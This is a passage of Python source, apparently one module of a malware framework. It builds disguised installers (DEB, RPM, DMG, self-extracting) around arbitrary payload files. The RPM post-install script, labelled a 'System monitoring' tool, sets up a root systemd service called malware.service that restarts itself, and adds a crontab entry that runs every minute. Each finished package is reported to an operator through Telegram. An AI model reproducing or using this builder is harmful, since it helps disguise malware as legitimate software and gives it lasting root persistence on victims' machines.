                    # dpkg-deb not available, create tar.gz
                    logger.warning("dpkg-deb not found, creating tar.gz instead", module="installer")
                    
                    tar_path = output_path.replace('.deb', '.tar.gz')
                    with tarfile.open(tar_path, 'w:gz') as tar:
                        tar.add(pkg_root, arcname=os.path.basename(pkg_root))
                    
                    output_path = tar_path
            
            # Calculate package size and hash
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            
            package_hash = ''
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    package_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Send Telegram notification
            self.send_telegram_notification(
                "DEB Package Created",
                f"Package: {os.path.basename(output_path)}\n"
                f"Size: {file_size/(1024*1024):.2f} MB\n"
                f"Hash: {package_hash[:16] if package_hash else 'N/A'}...\n"
                f"Files included: {len(files)}\n"
                f"Version: {pkg_version}\n"
                f"Architecture: {pkg_architecture}",
                output_path if os.path.exists(output_path) else None
            )
            
            logger.info(f"DEB package created: {output_path} ({file_size} bytes)", module="installer")
            return output_path
            
        except Exception as e:
            logger.error(f"DEB package creation error: {e}", module="installer")
            return None
    
    def create_rpm_package(self, files: List[str], package_name: str = None,
                          package_config: Dict[str, Any] = None) -> Optional[str]:
        """Create RPM package for Linux (RedHat/Fedora)"""
        try:
            if not files:
                logger.error("No files provided for package", module="installer")
                return None
            
            # Default configuration
            config = package_config or {}
            
            pkg_name = package_name or config.get('name', 'malware-package')
            pkg_version = config.get('version', '1.0.0')
            pkg_release = config.get('release', '1')
            pkg_summary = config.get('summary', 'System package')
            pkg_license = config.get('license', 'GPL')
            pkg_group = config.get('group', 'System Environment/Base')
            
            output_path = os.path.join(self.installers_dir, f"{pkg_name}-{pkg_version}-{pkg_release}.noarch.rpm")
            
            with tempfile.TemporaryDirectory() as tmp_dir:
                # Create RPM build structure
                rpm_root = os.path.join(tmp_dir, 'rpmbuild')
                spec_dir = os.path.join(rpm_root, 'SPECS')
                build_dir = os.path.join(rpm_root, 'BUILD')
                rpm_dir = os.path.join(rpm_root, 'RPMS', 'noarch')
                sources_dir = os.path.join(rpm_root, 'SOURCES')
                
                for d in [spec_dir, build_dir, rpm_dir, sources_dir]:
                    os.makedirs(d, exist_ok=True)
                
                # Create source tarball
                source_dir = os.path.join(build_dir, pkg_name)
                install_dir = os.path.join(source_dir, 'usr', 'local', 'bin')
                
                os.makedirs(install_dir, exist_ok=True)
                
                # Copy files to source directory
                for file_spec in files:
                    if isinstance(file_spec, str):
                        src_file = file_spec
                        dst_file = os.path.basename(src_file)
                    elif isinstance(file_spec, dict):
                        src_file = file_spec.get('src')
                        dst_file = file_spec.get('dst', os.path.basename(src_file))
                    
                    if src_file and os.path.exists(src_file):
                        dst_path = os.path.join(install_dir, dst_file)
                        shutil.copy2(src_file, dst_path)
                        
                        # Make executable
                        if (dst_file.endswith(('.sh', '.py', '.pl', '.rb')) or 
                            '.' not in dst_file):
                            os.chmod(dst_path, 0o755)
                
                # Create spec file
                spec_content = f"""Name: {pkg_name}
Version: {pkg_version}
Release: {pkg_release}
Summary: {pkg_summary}
License: {pkg_license}
Group: {pkg_group}
BuildArch: noarch
BuildRoot: %{{_tmppath}}/%{{name}}-%{{version}}-%{{release}}-root

%description
{pkg_summary} - System monitoring and maintenance tool.

%prep
# No preparation needed

%build
# No build needed

%install
rm -rf $RPM_BUILD_ROOT
mkdir -p $RPM_BUILD_ROOT
cp -r %{{_builddir}}/%{{name}}/* $RPM_BUILD_ROOT/

%post
# Post-installation script
echo "Installing system service..."

# Create systemd service
if [ -d /run/systemd/system ]; then
    cat > /etc/systemd/system/malware.service << 'EOF'
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/{main_binary}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable malware.service
    systemctl start malware.service
fi

# Add to crontab
(crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/{main_binary} >/dev/null 2>&1") | crontab -

%preun
# Pre-uninstall script
if [ $1 -eq 0 ]; then
    # Package removal, not upgrade
    echo "Removing system service..."
    
    # Stop systemd service
    if [ -d /run/systemd/system ]; then
        systemctl stop malware.service 2>/dev/null
        systemctl disable malware.service 2>/dev/null
        rm -f /etc/systemd/system/malware.service
        systemctl daemon-reload
    fi
    
    # Remove from crontab
    crontab -l 2>/dev/null | grep -v "/usr/local/bin/" | crontab -
fi

%files
%defattr(-,root,root,-)
/usr/local/bin/*

%changelog
* {datetime.now().strftime('%a %b %d %Y')} Root <root@localhost> - {pkg_version}-{pkg_release}
- Initial package
"""
                
                # Determine main binary
                main_binary = None
                for file_spec in files:
                    if isinstance(file_spec, dict):
                        src = file_spec.get('src')
                    else:
                        src = file_spec
                    
                    if src and os.path.exists(src):
                        basename = os.path.basename(src)
                        if basename.endswith(('.sh', '.py', '')) or '.' not in basename:
                            main_binary = basename
                            break
                
                if main_binary:
                    spec_content = spec_content.format(main_binary=main_binary)
                
                spec_path = os.path.join(spec_dir, f"{pkg_name}.spec")
                with open(spec_path, 'w') as f:
                    f.write(spec_content)
                
                # Create source tarball
                source_tar = os.path.join(sources_dir, f"{pkg_name}-{pkg_version}.tar.gz")
                with tarfile.open(source_tar, 'w:gz') as tar:
                    tar.add(source_dir, arcname=pkg_name)
                
                # Build RPM
                try:
                    cmd = ['rpmbuild', '-bb', '--define', f'_topdir {rpm_root}', spec_path]
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        # Find the built RPM
                        for root, dirs, files in os.walk(rpm_dir):
                            for file in files:
                                if file.endswith('.rpm'):
                                    rpm_file = os.path.join(root, file)
                                    shutil.copy2(rpm_file, output_path)
                                    break
                    else:
                        logger.error(f"RPM build failed: {result.stderr}", module="installer")
                        
                        # Fallback: Create tar.gz
                        tar_path = output_path.replace('.rpm', '.tar.gz')
                        with tarfile.open(tar_path, 'w:gz') as tar:
                            tar.add(source_dir, arcname=pkg_name)
                        
                        output_path = tar_path
                        logger.info(f"Created tar.gz fallback: {tar_path}", module="installer")
                
                except FileNotFoundError:
                    # rpmbuild not available
                    logger.warning("rpmbuild not found, creating tar.gz instead", module="installer")
                    
                    tar_path = output_path.replace('.rpm', '.tar.gz')
                    with tarfile.open(tar_path, 'w:gz') as tar:
                        tar.add(source_dir, arcname=pkg_name)
                    
                    output_path = tar_path
            
            # Calculate package size and hash
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            
            package_hash = ''
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    package_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Send Telegram notification
            self.send_telegram_notification(
                "RPM Package Created",
                f"Package: {os.path.basename(output_path)}\n"
                f"Size: {file_size/(1024*1024):.2f} MB\n"
                f"Hash: {package_hash[:16] if package_hash else 'N/A'}...\n"
                f"Files included: {len(files)}\n"
                f"Version: {pkg_version}-{pkg_release}",
                output_path if os.path.exists(output_path) else None
            )
            
            logger.info(f"RPM package created: {output_path} ({file_size} bytes)", module="installer")
            return output_path
            
        except Exception as e:
            logger.error(f"RPM package creation error: {e}", module="installer")
            return None
    
    def create_dmg_package(self, files: List[str], volume_name: str = None,
                          package_config: Dict[str, Any] = None) -> Optional[str]:
        """Create DMG package for macOS"""
        try:
            if not files:
                logger.error("No files provided for package", module="installer")
                return None
            
            # Default configuration
            config = package_config or {}
            
            vol_name = volume_name or config.get('name', 'System Installer')
            output_name = config.get('output_name', 'installer')
            
            output_path = os.path.join(self.installers_dir, f"{output_name}.dmg")
            
            with tempfile.TemporaryDirectory() as tmp_dir:
                # Create DMG content directory
                dmg_content = os.path.join(tmp_dir, 'content')
                os.makedirs(dmg_content, exist_ok=True)
                
                # Copy files to DMG content
                for file_spec in files:
                    if isinstance(file_spec, str):
                        src_file = file_spec
                        dst_file = os.path.basename(src_file)
                    elif isinstance(file_spec, dict):
                        src_file = file_spec.get('src')
                        dst_file = file_spec.get('dst', os.path.basename(src_file))
                    
                    if src_file and os.path.exists(src_file):
                        dst_path = os.path.join(dmg_content, dst_file)
                        shutil.copy2(src_file, dst_path)
                        
                        # Make executable
                        if (dst_file.endswith(('.sh', '.py', '.pl', '.rb', '.app')) or 
                            '.' not in dst_file):
                            os.chmod(dst_path, 0o755)
                
                # Create background image (optional)
                bg_path = os.path.join(dmg_content, '.background')
                os.makedirs(bg_path, exist_ok=True)
                
                # Create simple background image
                try:
                    from PIL import Image, ImageDraw
                    
                    img = Image.new('RGB', (600, 400), color='black')
                    draw = ImageDraw.Draw(img)
                    
                    # Add some text
                    draw.text((50, 50), vol_name, fill='white')
                    draw.text((50, 100), "Drag to Applications folder", fill='gray')
                    
                    bg_image = os.path.join(bg_path, 'background.png')
                    img.save(bg_image)
                except ImportError:
                    # PIL not available, skip background
                    pass
                
# Create DS_Store file for DMG layout
                dsstore_path = os.path.join(dmg_content, '.DS_Store')
                with open(dsstore_path, 'wb') as f:
                    # Simple DS_Store with basic layout
                    f.write(b'Bud1\x00\x00\x00\x01\x00\x00\x00\x00')
                
                # Create Applications folder link
                apps_link = os.path.join(dmg_content, 'Applications')
                os.symlink('/Applications', apps_link)
                
                # Create DMG using hdiutil (macOS only) or fallback to tar
                if sys.platform == 'darwin' and shutil.which('hdiutil'):
                    try:
                        # Create temporary DMG
                        temp_dmg = os.path.join(tmp_dir, 'temp.dmg')
                        
                        cmd = [
                            'hdiutil', 'create',
                            '-srcfolder', dmg_content,
                            '-volname', vol_name,
                            '-fs', 'HFS+',
                            '-format', 'UDZO',
                            '-ov',
                            temp_dmg
                        ]
                        
                        result = subprocess.run(cmd, capture_output=True, text=True)
                        
                        if result.returncode == 0:
                            shutil.copy2(temp_dmg, output_path)
                        else:
                            raise Exception(f"hdiutil failed: {result.stderr}")
                    
                    except Exception as e:
                        logger.error(f"DMG creation with hdiutil failed: {e}", module="installer")
                        
                        # Fallback to tar.gz
                        tar_path = output_path.replace('.dmg', '.tar.gz')
                        with tarfile.open(tar_path, 'w:gz') as tar:
                            tar.add(dmg_content, arcname=vol_name)
                        
                        output_path = tar_path
                
                else:
                    # Not on macOS or hdiutil not available
                    logger.warning("hdiutil not available, creating tar.gz instead", module="installer")
                    
                    tar_path = output_path.replace('.dmg', '.tar.gz')
                    with tarfile.open(tar_path, 'w:gz') as tar:
                        tar.add(dmg_content, arcname=vol_name)
                    
                    output_path = tar_path
            
            # Calculate package size and hash
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            
            package_hash = ''
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    package_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Send Telegram notification
            self.send_telegram_notification(
                "DMG Package Created",
                f"Package: {os.path.basename(output_path)}\n"
                f"Size: {file_size/(1024*1024):.2f} MB\n"
                f"Hash: {package_hash[:16] if package_hash else 'N/A'}...\n"
                f"Files included: {len(files)}\n"
                f"Volume name: {vol_name}",
                output_path if os.path.exists(output_path) else None
            )
            
            logger.info(f"DMG package created: {output_path} ({file_size} bytes)", module="installer")
            return output_path
            
        except Exception as e:
            logger.error(f"DMG package creation error: {e}", module="installer")
            return None
    
    def create_installer_package(self, files: List[str], package_type: str = 'auto',
                                package_config: Dict[str, Any] = None) -> Optional[str]:
        """Create installer package based on type"""
        try:
            config = package_config or {}
            
            # Determine package type based on platform if auto
            if package_type == 'auto':
                if sys.platform == 'win32':
                    package_type = 'nsis'
                elif sys.platform == 'linux':
                    # Try to detect distribution
                    try:
                        with open('/etc/os-release', 'r') as f:
                            content = f.read().lower()
                            if 'debian' in content or 'ubuntu' in content:
                                package_type = 'deb'
                            elif 'redhat' in content or 'centos' in content or 'fedora' in content:
                                package_type = 'rpm'
                            else:
                                package_type = 'self_extracting'
                    except:
                        package_type = 'self_extracting'
                elif sys.platform == 'darwin':
                    package_type = 'dmg'
                else:
                    package_type = 'self_extracting'
            
            # Create appropriate package
            if package_type == 'nsis':
                return self.create_nsis_installer(files, None, config)
            
            elif package_type == 'inno':
                return self.create_inno_setup_installer(files, None, config)
            
            elif package_type == 'self_extracting':
                return self.create_self_extracting_archive(
                    files,
                    None,
                    config.get('extract_to'),
                    config.get('auto_execute'),
                    config.get('password')
                )
            
            elif package_type == 'deb':
                return self.create_deb_package(files, None, config)
            
            elif package_type == 'rpm':
                return self.create_rpm_package(files, None, config)
            
            elif package_type == 'dmg':
                return self.create_dmg_package(files, None, config)
            
            else:
                logger.error(f"Unknown package type: {package_type}", module="installer")
                return None
            
        except Exception as e:
            logger.error(f"Installer package creation error: {e}", module="installer")
            return None
    
    def create_cross_platform_bundle(self, files_by_platform: Dict[str, List[str]],
                                    bundle_config: Dict[str, Any] = None) -> Dict[str, str]:
        """Create installer packages for multiple platforms"""
        try:
            config = bundle_config or {}
            results = {}
            
            for platform, files in files_by_platform.items():
                if not files:
                    continue
                
                platform_config = config.get(platform, {})
                
                if platform == 'windows':
                    result = self.create_nsis_installer(files, None, platform_config)
                    if result:
                        results[platform] = result
                
                elif platform == 'linux_deb':
                    result = self.create_deb_package(files, None, platform_config)
                    if result:
                        results['linux_deb'] = result
                
                elif platform == 'linux_rpm':
                    result = self.create_rpm_package(files, None, platform_config)
                    if result:
                        results['linux_rpm'] = result
                
                elif platform == 'macos':
                    result = self.create_dmg_package(files, None, platform_config)
                    if result:
                        results['macos'] = result
                
                elif platform == 'universal':
                    result = self.create_self_extracting_archive(
                        files,
                        None,
                        platform_config.get('extract_to'),
                        platform_config.get('auto_execute'),
                        platform_config.get('password')
                    )
                    if result:
                        results['universal'] = result
            
            # Send summary notification
            if results:
                summary = f"Cross-platform bundle created:\n"
                for platform, path in results.items():
                    size = os.path.getsize(path) if os.path.exists(path) else 0
                    summary += f"- {platform}: {os.path.basename(path)} ({size/(1024*1024):.1f} MB)\n"
                
                self.send_telegram_notification(
                    "Cross-Platform Bundle Complete",
                    summary
                )
            
            logger.info(f"Cross-platform bundle created with {len(results)} packages", module="installer")
            return results
            
        except Exception as e:
            logger.error(f"Cross-platform bundle creation error: {e}", module="installer")
            return {}
    
    def get_available_package_types(self) -> Dict[str, bool]:
        """Get available package types based on system"""
        available = {
            'nsis': False,
            'inno': False,
            'self_extracting': True,  # Always available
            'deb': False,
            'rpm': False,
            'dmg': False
        }
        
        # Check NSIS
        nsis_paths = ['makensis', 'makensis.exe']
        for path in nsis_paths:
            try:
                result = subprocess.run([path, '/VERSION'], capture_output=True)
                if result.returncode == 0:
                    available['nsis'] = True
                    break
            except:
                continue
        
        # Check dpkg-deb for DEB
        try:
            result = subprocess.run(['dpkg-deb', '--version'], capture_output=True)
            available['deb'] = result.returncode == 0
        except:
            pass
        
        # Check rpmbuild for RPM
        try:
            result = subprocess.run(['rpmbuild', '--version'], capture_output=True)
            available['rpm'] = result.returncode == 0
        except:
            pass
        
        # Check hdiutil for DMG
        try:
            result = subprocess.run(['hdiutil', 'version'], capture_output=True)
            available['dmg'] = result.returncode == 0
        except:
            pass
        
        return available
    
    def get_status(self) -> Dict[str, Any]:
        """Get installer creator status"""
        available_types = self.get_available_package_types()
        
        return {
            'available_package_types': available_types,
            'installers_dir': self.installers_dir,
            'telegram_available': self.telegram_bot is not None,
            'total_installers_created': len(os.listdir(self.installers_dir)) 
                if os.path.exists(self.installers_dir) else 0
        }

# Global instance
_installer = None

def get_installer_creator(config: Dict = None) -> InstallerCreator:
    """Get or create installer creator instance"""
    global _installer
    
    if _installer is None:
        _installer = InstallerCreator(config)
    
    return _installer

if __name__ == "__main__":
    # Test the installer creator
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'installer_chat_id': 123456789
        }
    }
    
    installer = get_installer_creator(config)
    
    print("Testing installer creator...")
    
    # Check available package types
    available = installer.get_available_package_types()
    print(f"Available package types: {available}")
    
    # Create test files
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Create a simple executable
        test_exe = os.path.join(tmp_dir, 'test_app')
        if sys.platform == 'win32':
            test_exe += '.exe'
        
        with open(test_exe, 'wb') as f:
            f.write(b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\t\xCD!\xB8\x01L\xCD!')
        
        # Create config file
        test_config = os.path.join(tmp_dir, 'config.json')
        with open(test_config, 'w') as f:
            json.dump({'test': True, 'version': '1.0'}, f)
        
        files = [test_exe, test_config]
        
        # Test self-extracting archive (always works)
        print("\nTesting self-extracting archive...")
        archive = installer.create_self_extracting_archive(
            files,
            output_name='test_bundle',
            extract_to='$TEMP/test_app',
            auto_execute='test_app.exe' if sys.platform == 'win32' else 'test_app'
        )
        
        if archive and os.path.exists(archive):
            print(f"Self-extracting archive created: {archive}")
            print(f"Size: {os.path.getsize(archive)/(1024*1024):.2f} MB")
        
        # Test platform-specific installer if available
        if sys.platform == 'win32' and available['nsis']:
            print("\nTesting NSIS installer...")
            nsis_installer = installer.create_nsis_installer(
                files,
                output_name='TestInstaller',
                installer_config={
                    'name': 'Test Application',
                    'version': '1.0.0',
                    'company': 'Test Corp',
                    'add_to_startup': True
                }
            )
            
            if nsis_installer and os.path.exists(nsis_installer):
                print(f"NSIS installer created: {nsis_installer}")
        
        elif sys.platform == 'linux' and available['deb']:
            print("\nTesting DEB package...")
            deb_package = installer.create_deb_package(
                files,
                package_name='test-package',
                package_config={
                    'version': '1.0.0',
                    'description': 'Test package'
                }
            )
            
            if deb_package and os.path.exists(deb_package):
                print(f"DEB package created: {deb_package}")
        
        elif sys.platform == 'darwin' and available['dmg']:
            print("\nTesting DMG package...")
            dmg_package = installer.create_dmg_package(
                files,
                volume_name='Test Installer',
                package_config={
                    'output_name': 'test_installer'
                }
            )
            
            if dmg_package and os.path.exists(dmg_package):
                print(f"DMG package created: {dmg_package}")
    
    # Show status
    status = installer.get_status()
    print(f"\n📦 Installer Creator Status: {status}")
    
    print("\n✅ Installer tests completed!")

